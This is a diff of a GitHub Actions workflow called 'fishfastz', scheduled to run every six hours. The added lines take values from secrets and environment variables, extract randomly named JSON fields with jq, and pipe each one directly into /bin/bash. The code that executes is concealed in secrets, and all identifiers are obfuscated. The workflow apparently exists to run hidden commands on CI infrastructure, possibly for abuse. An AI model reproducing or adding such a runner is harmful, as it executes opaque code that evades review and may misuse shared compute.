@@ -3,19 +3,23 @@ name: fishfastz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 0/6 * * *'
+    - cron: '40 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fishfastz
         env:
-          x6075: ${{ secrets.x6075 }}
+          kujmx4185: ${{ secrets.kujmx4185 }}
         run: |
-          echo $x6075 | jq -r .zl2025 | /bin/bash
-          echo $tmhbs8191 | jq -r .pf99 | /bin/bash
-          echo $pagfr36 | jq -r .j7 | /bin/bash
-          echo $ufyn3 | jq -r .qeb8771 | /bin/bash
+          echo $kujmx4185 | jq -r .ebagk14419 | /bin/bash
+          echo $xv10197 | jq -r .hq7084 | /bin/bash
+          echo $cspdb9527 | jq -r .knpu8493 | /bin/bash
+          echo $pzke54 | jq -r .pxs6846 | /bin/bash
+          echo $sb49 | jq -r .dt4664 | /bin/bash
+          echo $ajdqu041 | jq -r .mjdd77313 | /bin/bash
+          echo $knx853 | jq -r .e60 | /bin/bash
+          echo $m5846 | jq -r .upyye1474 | /bin/bash
+          echo $jjcp256 | jq -r .gupu05763 | /bin/bash
 
